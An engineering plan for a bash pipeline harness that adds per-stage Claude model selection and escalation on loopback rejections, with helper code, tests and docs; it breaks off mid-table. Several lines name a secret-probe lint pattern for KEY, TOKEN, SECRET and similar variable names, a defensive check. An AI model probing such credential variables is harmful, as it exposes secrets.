---
linear: ENG-103
date: 2026-05-15
topic: Per-stage model tiering with rebase/loopback escalation via PIPELINE_DISPATCH_MODEL env-var hand-off
---

# Plan — Per-stage model tiering (ENG-103)

## Anti-anchoring check

- **Problem (operator-perspective):** "Every dispatch runs on Opus 4.7 even when
  the stage's work (build = `gh pr merge --auto`, qa single-pass, post-ENG-101
  implement = plan-following) doesn't need Opus capability — uniform Opus rates
  are the harness's worst-defensible default."
- **Brainstorm framing:** matches the problem one-for-one. The solution is one
  env-var hand-off + one argv splice + a built-in default table next to
  `_cost_flags_for` + an escalation predicate reusing the existing
  `verdict result=fail target=<stage>` marker. No new module, no new vocabulary
  registry entry, no new prompt-side change.
- **Proportionality:** ≤ 5 functions added; mirrors the ENG-65 per-stage
  timeout shape at `bin/dispatch.sh:469-488`. Proportional. Proceed.

## Goal

Resolve a per-stage Claude model in `bin/run-stage.sh` (operator config →
loopback-rejection escalation → built-in default → unset), hand it to
`bin/dispatch.sh` via `PIPELINE_DISPATCH_MODEL`, and conditionally splice
`--model "$PIPELINE_DISPATCH_MODEL"` into the `claude -p` argv so that at
initial-ship the operator sees `usage-building.json::model = claude-haiku-4-5-20251001`
and `usage-qa.json::model = claude-sonnet-4-6` (the two unconditional-flip rows),
and so that **after the D-008 follow-up flip** (gated on ENG-101 stabilising)
clean implementing dispatches show `claude-sonnet-4-6` while loopback iterations
escalate back to `claude-opus-4-7`. Initial-ship `implementing` stays
`claude-opus-4-7` (D-008 gate — no behavior change for implement until ENG-101).

## Assumption Inventory

Format: `[verified|assumed]` ITEM — `path:line` reference.

**branch-base freshness:** `HEAD..origin/main` is NON-EMPTY at plan time
(`06aa03b` merge + `9905326` `fix(dispatch): trailing gtime cleanup must be set -e safe`).
`9905326` modifies `bin/dispatch.sh:620` — the same file this plan modifies, but
a non-overlapping hunk (gtime cleanup at the trailing edge; this plan's edits are
at the DRY_RUN log line + cmd-composition block, ~50 lines earlier). Clean drift.
Task 0 rebases onto `origin/main` before any other implement work and re-verifies
the `path:line` excerpts below.

### Verified — code paths quoted from current tree

- `[verified]` `bin/dispatch.sh:561-568` — the cmd-composition block where the
  `--model` flag will be conditionally appended. Current content:
  ```
  cmd+=(gtimeout --signal=TERM --kill-after=10 "$timeout_seconds"
    claude -p
    --output-format stream-json --verbose
    --setting-sources project,local
    --disable-slash-commands
    --disallowed-tools "$denies"
    --allowed-tools "$tools"
  )
  ```
  No `--model` flag present. Plan splits this into three array-appends
  with the conditional in the middle.

- `[verified]` `bin/dispatch.sh:511-517` — the DRY_RUN branch that emits the
  `would invoke: gtimeout ...` log line. This log line is what
  `bin/dispatch-test.sh` Group 5 fixtures grep against (`gtimeout.*\b3600\b`
  pattern, line 279). New `--model "$PIPELINE_DISPATCH_MODEL"` token must
  appear inline when the env var is non-empty so the new dispatch-test.sh
  fixture (Task 4) can assert on it.

- `[verified]` `bin/dispatch.sh:469-488` — `_cfg_minutes` resolver. The
  proposed `_resolve_dispatch_model` mirrors this shape exactly:
  `jq -r --arg s "$stage" '...[$s] // empty' "$CONFIG" 2>/dev/null || true`
  + regex validation on the resolved string + fallthrough to built-in default.

- `[verified]` `bin/dispatch.sh:554-557` — env block carrying
  `PIPELINE_DISPATCH_ID` (line 555) and `PIPELINE_STAGE` (line 556) into the
  claude subshell. `PIPELINE_DISPATCH_MODEL` is NOT carried here (it's a
  flag, not a subshell-visible env var); it's consumed by the bash-side
  cmd composition only. ENG-46 secret-probe regex does NOT match
  `PIPELINE_DISPATCH_MODEL` (no KEY/TOKEN/SECRET/ANTHROPIC/GITHUB/LINEAR
  substring).

- `[verified]` `bin/dispatch.sh:617-620` — trailing gtime cleanup. Pre-rebase
  this is `[[ -n "$_gtime_out" ]] && rm -f "$_gtime_out"`. After Task 0
  rebase pulls in commit `9905326`, this becomes
  `if [[ -n "$_gtime_out" ]]; then rm -f "$_gtime_out"; fi`. Neither form
  conflicts with this plan's edits.

- `[verified]` `bin/dispatch.sh:623-625` — test sentinel
  (`if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then main "$@"; fi`) — enables
  test-side sourcing for `bin/dispatch-test.sh`.

- `[verified]` `bin/run-stage.sh:69-95` — `_cost_flags_for` helper. The new
  `_resolve_dispatch_model` and `_count_loopback_rejections_for_stage`
  helpers are placed in this "Cost-telemetry helpers (ENG-26)" block,
  immediately AFTER `_cost_flags_for`'s closing `}` (~line 95) and
  BEFORE the `_cost_footer` block-comment (~line 97). Content anchor:
  the line `_cost_flags_for() {` is unique in `bin/run-stage.sh`.

- `[verified]` `bin/run-stage.sh:1156-1162` — the actual dispatch.sh
  invocation site. Current content:
  ```
  local dispatch_rc=0
  PIPELINE_ISSUE_ID="$ident" \
    bash "$SCRIPT_DIR/dispatch.sh" "$stage" "$prompt_file" "$log_file" \
    || dispatch_rc=$?
  ```
  Plan inserts a `_resolve_dispatch_model` call before the dispatch and
  adds `PIPELINE_DISPATCH_MODEL` to the env block. Content anchor: the
  line `PIPELINE_ISSUE_ID="$ident" \` is unique in `bin/run-stage.sh`.

- `[verified]` `bin/run-stage.sh:1066-1075` — env-export pattern
  (`export PIPELINE_STAGE`, `allocate_dispatch_id`, `_clear_current_stage_slots`).
  The new resolver lives downstream of these in `main()`; the resolver
  runs after `_dispatch_id` allocation so the `log` line can correlate.

- `[verified]` `bin/guards.sh:51-70` — `count_marker_since_last_transition`
  is the precedent for "count comment markers newer than most recent
  transition." Uses `bash $SCRIPT_DIR/linear.sh get-comments`, then
  `jq` filtering on `select(.body | contains(...))`. The new
  `_count_loopback_rejections_for_stage` uses the SAME comment-fetch path
  but projects each body through `parse_pipeline_marker` instead of raw
  substring matching, to avoid the ENG-87 prose-quoted-marker hazard.

- `[verified]` `bin/common.sh:294-356` — `parse_pipeline_marker` is the
  canonical body-to-event parser; exported via `export -f` at
  `bin/common.sh:389`. Output for verdict-fail is
  `{event:"verdict", result:"fail", target:"<stage>"}` — exactly the
  shape the new counter filters on.

- `[verified]` `bin/verdict-handler.sh:179-200` — strict-id-match path
  iterating `parse_pipeline_marker` outputs. Demonstrates the exact
  `jq -r '.[] | "\(.createdAt)\t\(.id)\t\(.body | gsub("\n"; " "))"' <<<"$comments"`
  shape the new counter reuses.

- `[verified]` `bin/pipeline-events.json:25-30` — `fail_targets` is exactly
  `["brainstorming","planning","implementing","ui"]`. The escalation
  predicate's per-stage scope (D-002) is bounded to the
  `implementing`/`ui` subset; the brainstorming/planning rows in the
  registry exist for the `reviewing → brainstorming` / `reviewing →
  planning` loopback but are not in this plan's escalation scope.

- `[verified]` `bin/pipeline-events.json:51-60` — `stages` enumerates the
  canonical gerund form (`brainstorming, planning, implementing, ui,
  reviewing, qa, building, released`). The default table uses these keys
  verbatim.

- `[verified]` `bin/dispatch-test.sh:262-419` — Group 5 (ENG-48/ENG-65
  watchdog fixtures). The new `--model` dispatch-test fixture slots into
  this group, mirroring `_eng65_run_dispatch_dryrun` (lines 330-340) for
  per-stage variant runs. Content anchor: the H2-level comment
  `# ─── Group 5 (ENG-48): wall-clock watchdog wraps claude -p ──────`
  (line 262) is unique in the file.

- `[verified]` `CLAUDE.md:399-430` — `## Per-stage dispatch timeouts (ENG-65)`
  is the doc-section precedent for per-stage knobs. The new
  `## Per-stage dispatch model (ENG-103)` section is inserted AFTER the
  ENG-65 section's closing prose (the partial-usage paragraph ending
  `...partial: true (D-003 — distinguishes SIGTERM runs from genuine
  zero-cost dispatches).` at line 430) and BEFORE the
  `## Orchestrator entry-conditions (ENG-86)` header (line 432). Content
  anchor: both the closing prose line and the next H2 header are unique.

- `[verified]` `learned-rules/harness/project-profile.md:54-69` (implementing
  section, line 60 specifically lists `Bash(bash bin/run-stage-test.sh:*)`)
  and `:95-110` (qa section, line 101 specifically lists
  `Bash(bash bin/run-stage-test.sh:*)`). The new
  `bin/run-stage-model-test.sh` slots between `run-local-sweep-test.sh`
  and `run-stage-test.sh` (alphabetical, `m < t`). Content anchors: each
  list element is a unique `Bash(bash bin/<name>:*)` literal.

- `[verified]` `.pipeline/bin/secret-probe-lint.sh` and `bin/secret-probe-lint.sh`
  enforce ENG-46. The token `PIPELINE_DISPATCH_MODEL` is NOT a substring of
  any of `*KEY|*TOKEN|*SECRET|ANTHROPIC*|GITHUB*|LINEAR*` patterns; the
  presence-gated `[[ -n "${VAR:-}" ]] && cmd+=(--model "$VAR")` shape is
  explicitly safe for non-secret names (precedent at
  `bin/dispatch.sh:481`'s `[[ -n "$_cfg_minutes" && "$_cfg_minutes" =~ ^[0-9]+$ ]]`).

- `[verified]` `bin/dispatch-test.sh:2140-2168` — harness-self
  `.pipeline-config/config.json::dispatch.tools[stage]` enumeration
  assertion (ENG-53 #8 / ENG-77). Adds `bin/run-stage-model-test.sh` to
  on-disk test count; an operator running tests locally with a stale
  `.pipeline-config/config.json` would trip this assertion. The plan's
  step "regenerate operator config.json after creating the new test file"
  (Task 3 step 6) addresses this. The gitignored config is per-operator
  and out of repo scope; the tracked profile at
  `learned-rules/harness/project-profile.md` IS updated by Task 5.

### Assumed — needs verification or new code

- `[assumed/new]` `bin/run-stage-model-test.sh` — does not exist yet.
  Created by Task 5. Sentinel-pattern (sources `bin/run-stage.sh` for
  function access; stubs `bin/linear.sh get-comments` via `STUB_DIR`).

- `[assumed/new]` `_resolve_dispatch_model` function — does not exist yet.
  Created by Task 2 in `bin/run-stage.sh`, immediately after
  `_cost_flags_for`. Signature: `_resolve_dispatch_model <stage> <ident>`
  → stdout = resolved model literal (or empty). Soft-fails on every
  layer per error-handling §.

- `[assumed/new]` `_count_loopback_rejections_for_stage` function — does
  not exist yet. Created by Task 2 in `bin/run-stage.sh`, adjacent to
  `_resolve_dispatch_model`. Signature: `_count_loopback_rejections_for_stage
  <ident> <stage>` → stdout = integer count. Returns 0 on Linear API
  outage (fail-open to cheap tier per brainstorm §5).

- `[assumed]` `claude -p --model claude-sonnet-4-6` (and the other six
  identifiers in the default table) is accepted by the current claude
  CLI release. Validation deferred to runtime: the orchestrator log line
  `dispatch model=<resolved> (stage=<stage>)` plus the
  `usage-<stage>.json::model` extracted from claude's `system`/`init`
  event provides round-trip confirmation. A claude-side rejection exits
  non-zero and is classified by the existing `classify_failure` path
  (brainstorm §5 "Resolved model rejected by claude").

- `[assumed]` `claude-haiku-4-5-20251001` is the correct date-suffixed
  identifier for Haiku 4.5 at ship time. The Linear issue's "Defaults"
  table uses this literal. If Anthropic's released identifier differs at
  ship time, the operator updates the literal in the default table case
  statement and re-runs `bin/run-stage-model-test.sh`. The regex
  validator `^[A-Za-z0-9._\[\]:-]+$` accepts both
  `claude-haiku-4-5-20251001` and any plausible alternative form.

- `[assumed]` ENG-101's defensive-code restraint clause is NOT yet
  shipped (no `defensive-code` / `ENG-101` clause found in
  `AGENT_PROMPTS.md` per brainstorm §9). D-008 of the brainstorm gates
  the `implementing` default flip on ENG-101 merging first. This plan
  ships the **code mechanism** (Tasks 2-6) for all seven in-scope
  stages; Task 7 implements D-008 by setting the `implementing` row's
  default to `claude-opus-4-7` initially and Task 8 documents the cut-over
  procedure (one-line edit to flip to `claude-sonnet-4-6` once ENG-101
  is observed-good).

## File Structure

### New files

- `bin/run-stage-model-test.sh` — sibling test for `_resolve_dispatch_model`
  + `_count_loopback_rejections_for_stage`, 16 fixtures per brainstorm
  D-006.

### Modified files

- `bin/run-stage.sh` — add `_resolve_dispatch_model`,
  `_count_loopback_rejections_for_stage`; wire the resolver into the
  dispatch invocation in `main()`.
- `bin/dispatch.sh` — splice conditional `--model "$PIPELINE_DISPATCH_MODEL"`
  into `cmd` composition; mirror in DRY_RUN log line.
- `bin/dispatch-test.sh` — add one Group 5 fixture asserting the
  `--model` dry-run-log splice (both positive and negative).
- `CLAUDE.md` — new `## Per-stage dispatch model (ENG-103)` subsection
  alongside the existing ENG-65 timeouts section.
- `learned-rules/harness/project-profile.md` — add
  `bin/run-stage-model-test.sh` to the `implementing` and `qa` stage
  Tool allowlist sections (alphabetical insert between
  `run-local-sweep-test.sh` and `run-stage-test.sh`). **Test-allowlist
  plumbing only — does NOT add model selection to the profile.** The
  brainstorm §3 lists this file under "Files NOT modified (intentional)"
  for *model-selection logic*; that boundary holds. The only edit here
  is the two-line allowlist insertion required so the new sibling test
  is runnable inside implement/qa dispatches (per the `bin/dispatch-test.sh:2140-2168`
  ENG-77 enumeration assertion).

### Files NOT modified (intentional)

- `AGENT_PROMPTS.md` — orchestrator-side change; no prompt-side surface.
- `bin/pipeline-events.json` — no new vocabulary; reuses existing
  `verdict result=fail target=<stage>` marker family.
- `bin/verdict-handler.sh` — escalation predicate reads the same
  loopback marker shape verdict-handler already parses; no new emit.
- `bin/metrics.sh` — already accepts `--model <name>` (per the existing
  `_cost_flags_for` plumbing at `bin/run-stage.sh:93`); model field
  continues to flow from `usage-<stage>.json::model`.
- `bin/run-local.sh` — orchestrator entrypoint; env-var hand-off
  (`PIPELINE_DISPATCH_MODEL`) is `run-stage.sh → dispatch.sh` only.
- `bin/common.sh` — `parse_pipeline_marker` is reused as-is via the
  exported function (`bin/common.sh:389`).

## API Contract

no new API surface (orchestrator-internal env-var hand-off only;
`PIPELINE_DISPATCH_MODEL` is consumed within the bash process tree by
`dispatch.sh`'s cmd-composition).

## Backend Tasks

### Task 0: Rebase onto origin/main and re-verify Assumption Inventory

- `depends_on: []`
- `touches: bin/dispatch.sh (rebase only)`
- [ ] `git fetch origin main`
- [ ] `git rebase origin/main` — pulls in `06aa03b` + `9905326`.
- [ ] After rebase, re-verify each `path:line` excerpt in Assumption
  Inventory survived. The `9905326` fix only changes the trailing
  `[[ -n ]] && rm` at `bin/dispatch.sh:620` to an `if`-block (now
  `bin/dispatch.sh:617-625`); the cmd-composition block at
  `bin/dispatch.sh:561-568` and DRY_RUN log line at
  `bin/dispatch.sh:511-517` are UNCHANGED.
- [ ] If `path:line` excerpts drifted by more than ~5 lines from this
  plan, log the drift in the dispatch transcript and proceed (content
  anchors below pin the edit locations regardless of line numbers).

### Task 1: Add `_count_loopback_rejections_for_stage` helper to `bin/run-stage.sh`

- `depends_on: [0]`
- `touches: bin/run-stage.sh::_count_loopback_rejections_for_stage`
- [ ] In `bin/run-stage.sh`, AFTER the `_cost_flags_for` function's
  closing `}` (content anchor: the line `_cost_flags_for() {` is unique
  in `bin/run-stage.sh`; the function ends at the next `^}` line — for
  drift safety, locate via `awk '/^_cost_flags_for\(\) \{/,/^\}/' bin/run-stage.sh`
  to confirm the closing brace position) and BEFORE the block comment
  `# Format: leading newline so the caller can append unconditionally.`
  (content anchor: this comment is unique), insert the new helper:
  ```bash
  # Count <!-- pipeline: verdict result=fail target=<stage> --> markers
  # newer than the most recent <!-- pipeline: transition ... to=<stage> -->
  # comment. Used by _resolve_dispatch_model's escalation predicate (ENG-103
  # D-002). Reuses the comment-fetch path from
  # guards.sh::count_marker_since_last_transition but projects each body
  # through parse_pipeline_marker (common.sh) to avoid the ENG-87
  # prose-quoted-marker hazard. Fail-open: Linear API outage returns 0
  # (no escalation), matching the dispatch-side fail-open posture of
  # _entry_conditions_gate at bin/run-stage.sh's ENG-86 block.
  _count_loopback_rejections_for_stage() {
    local ident="$1" stage="$2"
    local comments
    comments="$(bash "$SCRIPT_DIR/linear.sh" get-comments "$ident" 2>/dev/null)" \
      || { printf '0'; return 0; }
    [[ -z "$comments" || "$comments" == "null" ]] && { printf '0'; return 0; }

    # Find most recent transition.to=<stage> createdAt (empty → count all).
    local last_ts="" body ts ev
    while IFS=$'\t' read -r ts body; do
      ev="$(parse_pipeline_marker "$body" 2>/dev/null || true)"
      [[ -z "$ev" ]] && continue
      if [[ "$(jq -r '.event' <<<"$ev")" == "transition" \
         && "$(jq -r '.to' <<<"$ev")" == "$stage" ]]; then
        [[ "$ts" > "$last_ts" ]] && last_ts="$ts"
      fi
    done < <(jq -r '.[] | "\(.createdAt)\t\(.body | gsub("\n"; " "))"' <<<"$comments" 2>/dev/null)

    # Count verdict.result=fail.target=<stage> newer than last_ts.
    local count=0
    while IFS=$'\t' read -r ts body; do
      [[ -n "$last_ts" && ! "$ts" > "$last_ts" ]] && continue
      ev="$(parse_pipeline_marker "$body" 2>/dev/null || true)"
      [[ -z "$ev" ]] && continue
      if [[ "$(jq -r '.event' <<<"$ev")" == "verdict" \
         && "$(jq -r '.result' <<<"$ev")" == "fail" \
         && "$(jq -r '.target' <<<"$ev")" == "$stage" ]]; then
        count=$((count + 1))
      fi
    done < <(jq -r '.[] | "\(.createdAt)\t\(.body | gsub("\n"; " "))"' <<<"$comments" 2>/dev/null)

    printf '%s' "$count"
  }
  ```
- [ ] Confirm the function body uses NO secret-handling-banned env-var
  expansions (`${KEY:-...}` / `${TOKEN:+...}` etc.). All env reads are
  via explicit `bash bin/linear.sh` calls.

### Task 2: Add `_resolve_dispatch_model` helper to `bin/run-stage.sh`

- `depends_on: [1]`
- `touches: bin/run-stage.sh::_resolve_dispatch_model`
- [ ] In `bin/run-stage.sh`, IMMEDIATELY AFTER the
  `_count_loopback_rejections_for_stage` function added by Task 1
  (content anchor: the closing `}` of that function), insert the new
  resolver:
  ```bash
  # Resolve the model identifier for a dispatched stage. Precedence
  # (highest → lowest), mirroring _cfg_minutes at bin/dispatch.sh:469-488:
  #   1. .pipeline-config/config.json::dispatch.model[<stage>]
  #   2. Built-in escalation override on implementing/ui when
  #      _count_loopback_rejections_for_stage >= 1.
  #   3. Built-in default table (ENG-103 D-001).
  #   4. Unset → empty stdout → dispatch.sh omits --model.
  # Validation: claude model identifiers match [A-Za-z0-9._\[\]:-]+.
  # Regex-fail at layer 1 logs a warning and falls through to layer 2.
  _resolve_dispatch_model() {
    local stage="$1" ident="$2"

    # Layer 1: operator-pinned config.
    if [[ -f "$CONFIG" ]]; then
      local _cfg
      _cfg="$(jq -r --arg s "$stage" '.dispatch.model[$s] // empty' \
        "$CONFIG" 2>/dev/null || true)"
      if [[ -n "$_cfg" ]]; then
        if [[ "$_cfg" =~ ^[A-Za-z0-9._\[\]:-]+$ ]]; then
          printf '%s' "$_cfg"; return 0
        else
          log "_resolve_dispatch_model: rejecting config value for $stage (failed regex); falling through" >&2
        fi
      fi
    fi

    # Layer 2: escalation override (implementing | ui only).
    case "$stage" in
      implementing|ui)
        local _count
        _count="$(_count_loopback_rejections_for_stage "$ident" "$stage" 2>/dev/null || printf '0')"
        if [[ "$_count" =~ ^[0-9]+$ ]] && (( _count >= 1 )); then
          printf 'claude-opus-4-7'; return 0
        fi
        ;;
    esac

    # Layer 3: built-in default table (ENG-103 D-001).
    case "$stage" in
      brainstorming) printf 'claude-opus-4-7' ;;
      planning)      printf 'claude-opus-4-7' ;;
      implementing)  printf 'claude-sonnet-4-6' ;;
      ui)            printf 'claude-sonnet-4-6' ;;
      reviewing)     printf 'claude-opus-4-7' ;;
      qa)            printf 'claude-sonnet-4-6' ;;
      building)      printf 'claude-haiku-4-5-20251001' ;;
      *)             printf '' ;;  # released, retrospective → subscription default
    esac
  }
  ```
- [ ] **D-008 gate for implementing default.** Initial commit ships
  `implementing) printf 'claude-opus-4-7' ;;` (matches today's behavior;
  Sonnet flip is a follow-up commit once ENG-101 is observed-good).
  Comment the row inline: `# implementing default: stays Opus until
  ENG-101 stabilises (D-008); flip to claude-sonnet-4-6 in follow-up
  commit when ENG-101 ships.`
- [ ] Confirm the helper uses NO ENG-46-banned env-var-expansion shapes.
  All variables read are local lvalues bound by `=`, NOT `${X:-...}` /
  `${X:+...}` against secret-regex-matching names.

### Task 3: Wire the resolver into `bin/run-stage.sh::main()`

- `depends_on: [2]`
- `touches: bin/run-stage.sh::main (the dispatch.sh invocation block)`
- [ ] Locate the dispatch.sh invocation block in `bin/run-stage.sh::main()`
  via content anchor: the line `PIPELINE_ISSUE_ID="$ident" \` is unique
  in the file (~line 1160). The block currently reads:
  ```
  local dispatch_rc=0
  PIPELINE_ISSUE_ID="$ident" \
    bash "$SCRIPT_DIR/dispatch.sh" "$stage" "$prompt_file" "$log_file" \
    || dispatch_rc=$?
  ```
- [ ] Replace with:
  ```
  local dispatch_rc=0
  local resolved_model
  resolved_model="$(_resolve_dispatch_model "$stage" "$ident" 2>/dev/null || printf '')"
  if [[ -n "$resolved_model" ]]; then
    log "dispatch model=$resolved_model (stage=$stage)"
  fi
  PIPELINE_ISSUE_ID="$ident" \
    PIPELINE_DISPATCH_MODEL="$resolved_model" \
    bash "$SCRIPT_DIR/dispatch.sh" "$stage" "$prompt_file" "$log_file" \
    || dispatch_rc=$?
  ```
- [ ] Empty `$resolved_model` propagates as
  `PIPELINE_DISPATCH_MODEL=""` to dispatch.sh; the `[[ -n ... ]]` test
  there correctly elides the flag — verified by Task 4's fixture #11.

### Task 4: Splice `--model` into `bin/dispatch.sh` cmd composition + DRY_RUN log

- `depends_on: [0]` (only Task 0; no run-stage.sh dependency for this file)
- `touches: bin/dispatch.sh::main (cmd composition + DRY_RUN log)`
- [ ] In `bin/dispatch.sh::main()`, locate the cmd-composition block via
  content anchor: the line
  `cmd+=(gtimeout --signal=TERM --kill-after=10 "$timeout_seconds"`
  is unique in the file (~line 561). Split the existing single
  `cmd+=(...)` call into three array-appends:
  ```bash
  cmd+=(gtimeout --signal=TERM --kill-after=10 "$timeout_seconds"
    claude -p
    --output-format stream-json --verbose
  )
  if [[ -n "${PIPELINE_DISPATCH_MODEL:-}" ]]; then
    cmd+=(--model "$PIPELINE_DISPATCH_MODEL")
  fi
  cmd+=(
    --setting-sources project,local
    --disable-slash-commands
    --disallowed-tools "$denies"
    --allowed-tools "$tools"
  )
  ```
  Rationale: a single `cmd+=(--model "$PIPELINE_DISPATCH_MODEL")` correctly
  appends two elements to the array (`--model` and the value as separate
  argv positions). The `${VAR:+...}` collapse hazard (which would word-split
  the value into one element) is avoided by the explicit `if`-block.
- [ ] In the DRY_RUN branch (content anchor: the `if [[ "$PIPELINE_DRY_RUN"
  == "1" ]]; then` line — unique in the file, ~line 511), update the
  `log "[DRY_RUN] would invoke: ..."` line to inline the model flag when
  set. Replace the existing line:
  ```
  log "[DRY_RUN] would invoke: gtimeout --signal=TERM --kill-after=10 ${timeout_seconds} claude -p --output-format stream-json --verbose --setting-sources project,local --disable-slash-commands --disallowed-tools \"$denies\" --allowed-tools \"$tools\" < $prompt_file"
  ```
  with:
  ```bash
  local _dry_model_seg=""
  if [[ -n "${PIPELINE_DISPATCH_MODEL:-}" ]]; then
    _dry_model_seg=" --model $PIPELINE_DISPATCH_MODEL"
  fi
  log "[DRY_RUN] would invoke: gtimeout --signal=TERM --kill-after=10 ${timeout_seconds} claude -p --output-format stream-json --verbose${_dry_model_seg} --setting-sources project,local --disable-slash-commands --disallowed-tools \"$denies\" --allowed-tools \"$tools\" < $prompt_file"
  ```
  Note: `PIPELINE_DISPATCH_MODEL` does NOT match secret-probe-lint's
  regex (no `KEY|TOKEN|SECRET|ANTHROPIC|GITHUB|LINEAR` substring), so
  the `${PIPELINE_DISPATCH_MODEL:-}` presence check is ENG-46-clean —
  it's the canonical "is this set" pattern used by `_cfg_minutes` at
  `bin/dispatch.sh:481`.

### Task 5: Add `bin/run-stage-model-test.sh`

- `depends_on: [2, 3]`
- `touches: bin/run-stage-model-test.sh (new), learned-rules/harness/project-profile.md`
- [ ] Create `bin/run-stage-model-test.sh` following the
  source-and-stub pattern (per CLAUDE.md "How tests work"):
  1. `set -euo pipefail` + `SCRIPT_DIR` + `PIPELINE_DRY_RUN=1` +
     `LINEAR_API_KEY=test-mock-key`.
  2. Mint `_TEST_TARGET_DIR` + `_TEST_STUB_DIR` via `mktemp -d`, with
     the same `_test_assert_temp_path` safety guard
     `bin/dispatch-test.sh:24-29` ships.
  3. Scaffold a minimal `$TARGET_REPO/.pipeline-config/{config.json,
     schemas/linear-ids.json}`.
  4. Stub `bin/linear.sh` at `$_TEST_STUB_DIR/linear.sh` that prints
     a fixture-set JSON comments array for the `get-comments <ident>`
     subcommand, keyed off `$_FIXTURE_COMMENTS_FILE`.
  5. `source "$SCRIPT_DIR/run-stage.sh"` (test sentinel suppresses
     `main`). Post-source override `SCRIPT_DIR=$_TEST_STUB_DIR` so the
     helper's `bash "$SCRIPT_DIR/linear.sh"` calls resolve to the stub.
- [ ] Implement the 16 fixtures from brainstorm D-006 (one per row of
  the fixture table) **with one D-008-aware adjustment**: fixture #3
  (`implementing` + no config + count=0) expects `claude-opus-4-7` on
  the initial commit (matching Task 2's D-008-gated case-statement),
  NOT `claude-sonnet-4-6` as the brainstorm table shows. The
  brainstorm's `claude-sonnet-4-6` expectation describes post-D-008-flip
  behavior. Add an inline test comment: `# fixture-3: implementing
  default = opus until ENG-101 ships; flip the expected literal here to
  claude-sonnet-4-6 in the same commit that flips Task 2's case-statement.`
  Fixtures #1, #2, #6 (brainstorming, planning, ui — no D-008 gate)
  retain their brainstorm-table expectations literally.
  Each fixture:
  - Writes a fresh `linear-ids.json` if needed.
  - Writes the per-fixture comments-array JSON to
    `$_FIXTURE_COMMENTS_FILE`.
  - Writes the per-fixture `.pipeline-config/config.json::dispatch.model`
    value if the fixture has a config override.
  - Calls `result="$(_resolve_dispatch_model <stage> ENG-FIX-<n>)"`.
  - Asserts `result == <expected>` (or empty for fixture #11).
  - Pass/fail accumulator + final `printf 'run-stage-model: passed=%d
    failed=%d\n' "$PASS" "$FAIL"; exit $(( FAIL ? 1 : 0 ))`.
- [ ] Add a separate group at the bottom of the test file asserting
  `_count_loopback_rejections_for_stage` directly with three fixtures:
  (A) no comments → 0; (B) one verdict.fail.target=implementing
  newer than transition.to=implementing → 1; (C) one verdict.fail
  OLDER than the transition → 0. This isolates the counter from the
  resolver's case-statement so a regression in either is localized.
- [ ] Add `Bash(bash bin/run-stage-model-test.sh:*)` to
  `learned-rules/harness/project-profile.md` in BOTH the `implementing:`
  and `qa:` sections, alphabetically between
  `- \`Bash(bash bin/run-local-sweep-test.sh:*)\`` and
  `- \`Bash(bash bin/run-stage-test.sh:*)\``. Content anchors: both
  literal lines are unique in the profile file. Two insertions total
  (one per stage block).

### Task 6: Add dispatch-test.sh `--model` fixture

- `depends_on: [4]`
- `touches: bin/dispatch-test.sh (one new fixture in Group 5)`
- [ ] In `bin/dispatch-test.sh`, AFTER the existing Group 5 fixtures
  (content anchor: the trailing `done` of the
  `for stage in ui implementing qa; do ... done` loop ending at line
  ~419, locate via `awk '/built-in default for \$stage/{p=NR; exit}
  END{print p}' bin/dispatch-test.sh` for drift safety) and BEFORE the
  next H2-level comment header (use the existing
  `# ─── ENG-65 ...` style separator pattern), insert a new H2-level
  comment block + two fixtures:
  ```bash
  # ─── Group 5 (ENG-103): --model argv splice ──────────────────────────
  # PIPELINE_DISPATCH_MODEL is the env-var hand-off from run-stage.sh.
  # When non-empty, dispatch.sh splices `--model <value>` into both the
  # claude -p argv (production path) and the DRY_RUN log line (operator
  # audit trail). When empty/unset, the flag is omitted so claude uses
  # the subscription default — preserving today's behavior on hosts that
  # invoke dispatch.sh outside of run-stage.sh (e.g. mutex-test).
  printf '\n--- ENG-103: --model splice in DRY_RUN log ---\n'

  DRYRUN_OUT_M="$_TEST_STUB_DIR/dryrun-model.out"
  PIPELINE_DRY_RUN=1 \
  PIPELINE_DISPATCH_MODEL=claude-sonnet-4-6 \
    bash "$SCRIPT_DIR/dispatch.sh" implementing "$_PROMPT_FILE" 2>"$DRYRUN_OUT_M" >/dev/null || true

  if grep -qE -- '--model claude-sonnet-4-6' "$DRYRUN_OUT_M"; then
    pass_at "ENG-103: PIPELINE_DISPATCH_MODEL=claude-sonnet-4-6 splices --model into DRY_RUN log"
  else
    fail_at "ENG-103: --model splice missing from DRY_RUN log" \
      "log: $(cat "$DRYRUN_OUT_M")"
  fi

  DRYRUN_OUT_MU="$_TEST_STUB_DIR/dryrun-model-unset.out"
  PIPELINE_DRY_RUN=1 \
    bash "$SCRIPT_DIR/dispatch.sh" implementing "$_PROMPT_FILE" 2>"$DRYRUN_OUT_MU" >/dev/null || true

  if ! grep -qE -- '--model ' "$DRYRUN_OUT_MU"; then
    pass_at "ENG-103: PIPELINE_DISPATCH_MODEL unset omits --model from DRY_RUN log"
  else
    fail_at "ENG-103: --model leaked into DRY_RUN log when env var unset" \
      "log: $(cat "$DRYRUN_OUT_MU")"
  fi
  ```
- [ ] Both fixtures use the existing `$_PROMPT_FILE`, `$_TEST_STUB_DIR`,
  `pass_at`/`fail_at`, and `PASS`/`FAIL` accumulators from the test
  scaffold at `bin/dispatch-test.sh:13-75`.

### Task 7: Document the operator surface in CLAUDE.md

- `depends_on: [3, 4]`
- `touches: CLAUDE.md (new ## Per-stage dispatch model (ENG-103) subsection)`
- [ ] In `CLAUDE.md`, AFTER the closing prose paragraph of
  `## Per-stage dispatch timeouts (ENG-65)` (content anchor: the
  unique line `from genuine zero-cost dispatches).` — last line of the
  ENG-65 section, ~line 430) and BEFORE the
  `## Orchestrator entry-conditions (ENG-86)` header (content anchor:
  this H2 header is unique, ~line 432), insert a new H2-level
  subsection:
  ```markdown
  ## Per-stage dispatch model (ENG-103)

  `bin/run-stage.sh::_resolve_dispatch_model` resolves a Claude model
  identifier and exports it as `PIPELINE_DISPATCH_MODEL` to
  `bin/dispatch.sh::main`, which splices `--model "$VAR"` into the
  `claude -p` argv when set. Resolution precedence (highest first):

  1. `.pipeline-config/config.json::dispatch.model[<stage>]` — per-target
     operator pin.
  2. Escalation override (implementing/ui only) when
     `_count_loopback_rejections_for_stage >= 1` since the most recent
     `<!-- pipeline: transition ... to=<stage> -->`. Fires on both
     rebase loopback (`building → implementing`) and review loopback.
  3. Built-in default table:

  | Stage | Default |
  |---|---|
  | `brainstorming` | `claude-opus-4-7` |
  | `planning`      | `claude-opus-4-7` |
